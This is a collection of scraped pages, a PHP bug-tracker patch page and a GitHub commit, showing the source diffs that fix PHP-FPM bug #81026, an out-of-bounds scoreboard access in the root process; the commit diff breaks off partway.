kOpzH41nt7vlmaFb6Q5HCGNdrwIQ3CwavFdnIfF7YCV9tN7qJwI61KsBcGM6l5hW
1oCvUbEyeaaVNl2REsDNqtzJE154Prd//3pwShMNHlHcxwf+LV8=
=1d/J
-----END PGP SIGNATURE-----

```

---



=== Content from bugs.php.net_f4feb56c_20250115_115347.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Return to Bug #81026](bug.php?id=81026) | | --- | | Patch [fpm\_scoreboard\_proc\_oob\_fix\_v4.patch](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=latest) | revision [2021-10-10 19:20 UTC](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v3.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=latest) | revision [2021-05-31 21:55 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v2.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=latest) | revision [2021-05-31 21:16 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v1.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=latest) | revision [2021-05-31 13:32 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931&display=1) by bukka@php.net |  Patch fmp\_scoreboard\_proc\_oob\_v3.patch for FPM related Bug #81026 **Patch version 2021-05-31 21:55 UTC** [Return to Bug #81026](bug.php?id=81026) | [Download this patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128&download=1) This patch renders other patches obsolete Obsolete patches:  * [fmp\_scoreboard\_proc\_oob\_v2.patch, revision 2021-05-31 21:16 UTC](patch-display.php?patch=fmp_scoreboard_proc_oob_v2.patch&bug_id=81026&revision=1622495810) Patch Revisions:  * [2021-05-31 21:55 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128) [[diff to current]](patch-display.php?patch=fmp_scoreboard_proc_oob_v3.patch&bug_id=81026&diff=1&old=1622498128&revision=1622498128)  Developer: bukka@php.net ```  From 19e7d62e2128a5d9d4f5fa8e376a2e177f24b350 Mon Sep 17 00:00:00 2001 From: Jakub Zelenka <bukka@php.net> Date: Mon, 31 May 2021 14:26:09 +0100 Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to  privilege escalation)  ---  sapi/fpm/fpm/fpm_request.c    |  6 +++---  sapi/fpm/fpm/fpm_scoreboard.c | 36 +++++++++++++++++++++++++++++++++++  sapi/fpm/fpm/fpm_scoreboard.h |  2 ++  3 files changed, 41 insertions(+), 3 deletions(-)  diff --git a/sapi/fpm/fpm/fpm_request.c b/sapi/fpm/fpm/fpm_request.c index 83401f1553..540949b026 100644 --- a/sapi/fpm/fpm/fpm_request.c +++ b/sapi/fpm/fpm/fpm_request.c @@ -227,7 +227,7 @@ void fpm_request_check_timed_out(struct fpm_child_s *child, struct timeval *now,  {  	struct fpm_scoreboard_proc_s proc, *proc_p;   -	proc_p = fpm_scoreboard_proc_acquire(child->wp->scoreboard, child->scoreboard_i, 1); +	proc_p = fpm_scoreboard_proc_acquire_from_child(child, 1);  	if (!proc_p) {  		zlog(ZLOG_WARNING, "failed to acquire scoreboard");  		return; @@ -287,7 +287,7 @@ int fpm_request_is_idle(struct fpm_child_s *child) /* {{{ */  	struct fpm_scoreboard_proc_s *proc;    	/* no need in atomicity here */ -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return 0;  	} @@ -302,7 +302,7 @@ int fpm_request_last_activity(struct fpm_child_s *child, struct timeval *tv) /*    	if (!tv) return -1;   -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return -1;  	} diff --git a/sapi/fpm/fpm/fpm_scoreboard.c b/sapi/fpm/fpm/fpm_scoreboard.c index 328f999f0c..aa0aa9861b 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.c +++ b/sapi/fpm/fpm/fpm_scoreboard.c @@ -6,6 +6,7 @@  #include <time.h>    #include "fpm_config.h" +#include "fpm_children.h"  #include "fpm_scoreboard.h"  #include "fpm_shm.h"  #include "fpm_sockets.h" @@ -184,6 +185,24 @@ struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *s  }  /* }}} */   +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child) /* {{{*/ +{ +	struct fpm_worker_pool_s *wp = child->wp; +	struct fpm_scoreboard_proc_s *proc = fpm_scoreboard_proc_get(wp->scoreboard, child->scoreboard_i); +	size_t proc_ptr_array_size =  (wp->config->pm_max_children) * sizeof(struct fpm_scoreboard_proc_s *); +	ptrdiff_t proc_start = (uintptr_t) wp->scoreboard + sizeof(struct fpm_scoreboard_s) + proc_ptr_array_size; +	ptrdiff_t proc_end = proc_start + (wp->config->pm_max_children - 1) * sizeof(struct fpm_scoreboard_proc_s *); +	uintptr_t proc_position = (uintptr_t) proc; + +	if (proc_position < proc_start || proc_position > proc_end) { +		zlog(ZLOG_WARNING, "failed to get proc from the child scoreboard because the proc pointer is invalid"); +		return NULL; +	} + +	return proc; +} +/* }}} */ +  struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang) /* {{{ */  {  	struct fpm_scoreboard_s *s; @@ -225,6 +244,23 @@ struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_  }  /* }}} */   +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire_from_child(struct fpm_child_s *child, int nohang) /* {{{ */ +{ +	struct fpm_scoreboard_proc_s *proc; + +	proc = fpm_scoreboard_proc_get_from_child(child); +	if (!proc) { +		return NULL; +	} + +	if (!fpm_spinlock(&proc->lock, nohang)) { +		return NULL; +	} + +	return proc; +} +/* }}} */ +  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc) /* {{{ */  {  	if (!proc) { diff --git a/sapi/fpm/fpm/fpm_scoreboard.h b/sapi/fpm/fpm/fpm_scoreboard.h index 1fecde1d0f..ff7ed1806d 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.h +++ b/sapi/fpm/fpm/fpm_scoreboard.h @@ -72,10 +72,12 @@ int fpm_scoreboard_init_child(struct fpm_worker_pool_s *wp);  void fpm_scoreboard_update(int idle, int active, int lq, int lq_len, int requests, int max_children_reached, int slow_rq, int action, struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_s *fpm_scoreboard_get();  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *scoreboard, int child_index); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child);    struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang);  void fpm_scoreboard_release(struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_s *scoreboard, int child_index, int nohang); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire_from_child(struct fpm_child_s *child, int nohang);  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc);    void fpm_scoreboard_free(struct fpm_scoreboard_s *scoreboard); --  2.25.1   ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 11:01:31 2025 UTC |



=== Content from github.com_867de277_20250115_115354.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fcb2021e5f69da5e2868130a05bb53db0f9f89e4b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fcb2021e5f69da5e2868130a05bb53db0f9f89e4b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  563](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/cb2021e5f69da5e2868130a05bb53db0f9f89e4b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal…

[Browse files](/php/php-src/tree/cb2021e5f69da5e2868130a05bb53db0f9f89e4b)
Browse the repository at this point in the history

```
…ation)

The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.

Signed-off-by: Stanislav Malyshev <stas@php.net>
```

* Loading branch information

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&v=4)](/bukka) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=40&v=4)](/smalyshev)

[bukka](/php/php-src/commits?author=bukka "View all commits by bukka")
authored and
[smalyshev](/php/php-src/commits?author=smalyshev "View all commits by smalyshev")
committed
Oct 18, 2021

1 parent
[866adb1](/php/php-src/commit/866adb122a4a1d7062771fb7d239029b23c61d7a)

commit cb2021e

 Show file tree

 Hide file tree

Showing
**6 changed files**
with
**81 additions**
and
**60 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* sapi/fpm/fpm

  + sapi/fpm/fpm/fpm\_children.c
    [fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36)
  + sapi/fpm/fpm/fpm\_request.c
    [fpm\_request.c](#diff-7ca8f731ee921683e85b271ab731ae02f4cdc05b2cec6630ffa423b398c3e770)
  + sapi/fpm/fpm/fpm\_scoreboard.c
    [fpm\_scoreboard.c](#diff-5c4b3234616dbadda2d47a6c9dc035b7f96873bd2b324e61ace2713ae6ddace2)
  + sapi/fpm/fpm/fpm\_scoreboard.h
    [fpm\_scoreboard.h](#diff-6973e7a71e7238efe84f48f3db2c0f9d2d602b9822e89fab5a835ac3d34acf23)
  + sapi/fpm/fpm/fpm\_status.c
    [fpm\_status.c](#diff-838af21e79da4e7bd0e5c8a70aff09feda8066550d75c8fb1a6e9db674e431b5)
  + sapi/fpm/fpm/fpm\_worker\_pool.c
    [fpm\_worker\_pool.c](#diff-3ed2a6a89d2e60c82de36155bb1e27aba222471c5721a0c0c4322b88ee08ac42)

## There are no files selected for viewing

14 changes: 7 additions & 7 deletions

14
[sapi/fpm/fpm/fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36 "sapi/fpm/fpm/fpm_children.c")

Show comments

[View file](/php/php-src/blob/cb2021e5f69da5e2868130a05bb53db0f9f89e4b/sapi/fpm/fpm/fpm_children.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -246,7 +246,7 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  |  |
|  |  | fpm\_child\_unlink(child); |
|  |  |  |
|  |  | fpm\_scoreboard\_proc\_free(wp->scoreboard, child->scoreboard\_i); |
|  |  | fpm\_scoreboard\_proc\_free(child); |
|  |  |  |
|  |  | fpm\_clock\_get(&tv1); |
|  |  |  |
| Expand All | | @@ -256,9 +256,9 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  | if (!fpm\_pctl\_can\_spawn\_children()) { |
|  |  | severity = ZLOG\_DEBUG; |
|  |  | } |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } else { |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } |
|  |  |  |
|  |  | fpm\_child\_close(child, 1 /\* in event\_loop \*/); |
| Expand Down  Expand Up | | @@ -324,7 +324,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | if (0 > fpm\_scoreboard\_proc\_alloc(wp->scoreboard, &c->scoreboard\_i)) { |
|  |  | if (0 > fpm\_scoreboard\_proc\_alloc(c)) { |
|  |  | fpm\_stdio\_discard\_pipes(c); |
|  |  | fpm\_child\_free(c); |
|  |  | return 0; |
| Expand All | | @@ -336,7 +336,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  |  |
|  |  | static void fpm\_resources\_discard(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | fpm\_scoreboard\_proc\_free(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | fpm\_scoreboard\_proc\_free(child); |
|  |  | fpm\_stdio\_discard\_pipes(child); |
|  |  | fpm\_child\_free(child); |
|  |  | } |
| Expand All | | @@ -349,10 +349,10 @@ static void fpm\_child\_resources\_use(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | if (wp == child->wp) { |
|  |  | continue; |
|  |  | } |
|  |  | fpm\_scoreboard\_free(wp->scoreboard); |
|  |  | fpm\_scoreboard\_free(wp); |
|  |  | } |
|  |  |  |
|  |  | fpm\_scoreboard\_child\_use(child->wp->scoreboard, child->scoreboard\_i, getpid()); |
|  |  | fpm\_scoreboard\_child\_use(child, getpid()); |
|  |  | fpm\_stdio\_child\_use\_pipes(child); |
|  |  | fpm\_child\_free(child); |
|  |  | } |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_request.c](#diff-7ca8f731ee921683e85b271ab731ae02f4cdc05b2cec6630ffa423b398c3e770 "sapi/fpm/fpm/fpm_request.c")

Show comments

[View file](/php/php-src/blob/cb2021e5f69da5e2868130a05bb53db0f9f89e4b/sapi/fpm/fpm/fpm_request.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -285,7 +285,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  |  |
|  |  | /\* no need in atomicity here \*/ |
|  |  | proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return 0; |
|  |  | } |
| Expand All | | @@ -300,7 +300,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\* |
|  |  |  |
|  |  | if (!tv) return -1; |
|  |  |  |
|  |  | proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return -1; |
|  |  | } |
| Expand Down | |  |

106 changes: 63 additions & 43 deletions

106
[sapi/fpm/fpm/fpm\_scoreboard.c](#diff-5c4b3234616dbadda2d47a6c9dc035b7f96873bd2b324e61ace2713ae6ddace2 "sapi/fpm/fpm/fpm_scoreboard.c")

Show comments

[View file](/php/php-src/blob/cb2021e5f69da5e2868130a05bb53db0f9f89e4b/sapi/fpm/fpm/fpm_scoreboard.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,6 +6,7 @@ |
|  |  | #include <time.h> |
|  |  |  |
|  |  | #include "fpm\_config.h" |
|  |  | #include "fpm\_children.h" |
|  |  | #include "fpm\_scoreboard.h" |
|  |  | #include "fpm\_shm.h" |
|  |  | #include "fpm\_sockets.h" |
| Expand All | | @@ -23,7 +24,6 @@ static float fpm\_scoreboard\_tick; |
|  |  | int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp; |
|  |  | unsigned int i; |
|  |  |  |
|  |  | #ifdef HAVE\_TIMES |
|  |  | #if (defined(HAVE\_SYSCONF) && defined(\_SC\_CLK\_TCK)) |
| Expand All | | @@ -40,7 +40,7 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  |  |
|  |  |  |
|  |  | for (wp = fpm\_worker\_all\_pools; wp; wp = wp->next) { |
|  |  | size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  |  | size\_t scoreboard\_procs\_size; |
|  |  | void \*shm\_mem; |
|  |  |  |
|  |  | if (wp->config->pm\_max\_children < 1) { |
| Expand All | | @@ -53,22 +53,15 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  |  | scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  | shm\_mem = fpm\_shm\_alloc(scoreboard\_size + scoreboard\_nprocs\_size); |
|  |  | scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  | shm\_mem = fpm\_shm\_alloc(sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  |  |
|  |  | if (!shm\_mem) { |
|  |  | return -1; |
|  |  | } |
|  |  | wp->scoreboard = shm\_mem; |
|  |  | wp->scoreboard = shm\_mem; |
|  |  | wp->scoreboard->pm = wp->config->pm; |
|  |  | wp->scoreboard->nprocs = wp->config->pm\_max\_children; |
|  |  | shm\_mem += scoreboard\_size; |
|  |  |  |
|  |  | for (i = 0; i < wp->scoreboard->nprocs; i++, shm\_mem += sizeof(struct fpm\_scoreboard\_proc\_s)) { |
|  |  | wp->scoreboard->procs[i] = shm\_mem; |
|  |  | } |
|  |  |  |
|  |  | wp->scoreboard->pm = wp->config->pm; |
|  |  | wp->scoreboard->start\_epoch = time(NULL); |
|  |  | strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool)); |
|  |  | } |
| Expand Down  Expand Up | | @@ -162,28 +155,48 @@ struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get() /\* {{{\*/ |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  |  | static inline struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_ex( |
|  |  | struct fpm\_scoreboard\_s \*scoreboard, int child\_index, unsigned int nprocs) /\* {{{\*/ |
|  |  | { |
|  |  | if (!scoreboard) { |
|  |  | scoreboard = fpm\_scoreboard; |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= nprocs) { |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | return &scoreboard->procs[child\_index]; |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get( |
|  |  | struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  |  | { |
|  |  | if (!scoreboard) { |
|  |  | scoreboard = fpm\_scoreboard; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0) { |
|  |  | child\_index = fpm\_scoreboard\_i; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  |  | return NULL; |
|  |  | } |
|  |  | return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, scoreboard->nprocs); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | return scoreboard->procs[child\_index]; |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | unsigned int nprocs = wp->config->pm\_max\_children; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int child\_index = child->scoreboard\_i; |
|  |  |  |
|  |  | return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, nprocs); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  |  |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_scoreboard\_s \*s; |
| Expand Down  Expand Up | | @@ -234,28 +247,28 @@ void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/ |
|  |  | proc->lock = 0; |
|  |  | } |
|  |  |  |
|  |  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp) /\* {{{ \*/ |
|  |  | { |
|  |  | size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  |  | size\_t scoreboard\_procs\_size; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | zlog(ZLOG\_ERROR, "\*\*scoreboard is NULL"); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (scoreboard->nprocs) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  |  | scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* scoreboard->nprocs; |
|  |  | scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  |  |
|  |  | fpm\_shm\_free(scoreboard, scoreboard\_size + scoreboard\_nprocs\_size); |
|  |  | fpm\_shm\_free(scoreboard, sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  | fpm\_scoreboard = scoreboard; |
|  |  | fpm\_scoreboard\_i = child\_index; |
|  |  | proc = fpm\_scoreboard\_proc\_get(scoreboard, child\_index); |
|  |  | fpm\_scoreboard = child->wp->scoreboard; |
|  |  | fpm\_scoreboard\_i = child->scoreboard\_i; |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return; |
|  |  | } |
| Expand All | | @@ -264,60 +277,67 @@ void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int child\_index = child->scoreboard\_i; |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  |  | if (child\_index < 0 || child\_index >= wp->config->pm\_max\_children) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | if (scoreboard->procs[child\_index] && scoreboard->procs[child\_index]->used > 0) { |
